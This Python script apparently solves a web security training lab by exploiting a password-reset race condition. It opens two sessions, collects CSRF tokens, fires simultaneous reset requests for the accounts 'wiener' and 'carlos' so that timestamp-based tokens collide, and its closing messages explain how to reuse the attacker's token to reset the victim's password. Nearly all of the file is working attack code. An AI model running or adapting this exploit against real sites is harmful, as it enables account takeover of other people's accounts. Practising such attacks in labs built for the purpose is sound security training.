import sys
import os
import threading
import re
sys.path.insert(0, os.path.join(os.path.dirname(__file__), "../.."))
from utils.base import LabSession
from bs4 import BeautifulSoup
import requests

lab = LabSession()

# need two independent sessions to bypass per-session locking
session1 = requests.Session()
session2 = requests.Session()

# get CSRF tokens from two separate sessions
page1 = session1.get(lab.url("/forgot-password"))
soup1 = BeautifulSoup(page1.text, "html.parser")
csrf1 = soup1.find("input", {"name": "csrf"})["value"]

page2 = session2.get(lab.url("/forgot-password"))
soup2 = BeautifulSoup(page2.text, "html.parser")
csrf2 = soup2.find("input", {"name": "csrf"})["value"]

# warm up both connections
session1.get(lab.url("/"))
session2.get(lab.url("/"))

# send password reset for wiener and carlos simultaneously
# the token is generated from a timestamp hash - if both hit the same
# millisecond, they produce identical tokens
results = {}

def reset_wiener():
    resp = session1.post(lab.url("/forgot-password"),
                         data={"csrf": csrf1, "username": "wiener"})
    results["wiener"] = resp.status_code

def reset_carlos():
    resp = session2.post(lab.url("/forgot-password"),
                         data={"csrf": csrf2, "username": "carlos"})
    results["carlos"] = resp.status_code

lab.info("Sending parallel password reset requests...")

t1 = threading.Thread(target=reset_wiener)
t2 = threading.Thread(target=reset_carlos)
t1.start()
t2.start()
t1.join()
t2.join()

lab.info(f"Results: {results}")
lab.warn("Check the exploit server email client for wiener's reset link")
lab.warn("Use the same token but change username=wiener to username=carlos in the URL")
lab.warn("This lab requires manually using the reset link - tokens are timing-dependent")
